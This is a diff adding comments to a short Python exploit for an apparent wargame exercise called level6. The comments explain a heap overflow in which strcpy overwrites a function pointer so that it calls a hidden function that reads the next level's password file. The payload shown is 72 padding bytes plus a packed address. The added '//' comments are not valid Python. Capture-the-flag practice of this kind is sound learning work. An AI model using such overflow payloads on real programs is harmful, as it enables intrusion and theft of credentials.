@@ -1,5 +1,14 @@
+* In this level6 , the main function allocate a buff with 0x40 bytes on the heap , 
+* then it allocate 4 for a pointer to function m().
+* using strcpy it copy the first argument of the main to the buffer , then call the function m.
+
+==> strcpy can easly be abused to copy more data to the memory which enable us to run a heap overflow attack,
+by changing the pointer to function to point to a secret function n() that call /* system("/bin/cat /home/user/level7/.pass") */
+
+==> the following script i used to get it done:
+
 import struct
 
-padding = "A" * 72
-target_address = struct.pack("I", 0x8048454)
+padding = "A" * 72  // writing enough data to the heap to point pointer to function .
+target_address = struct.pack("I", 0x8048454)   // change the value pointed to by the pointer to the address of n().
 print padding + target_address
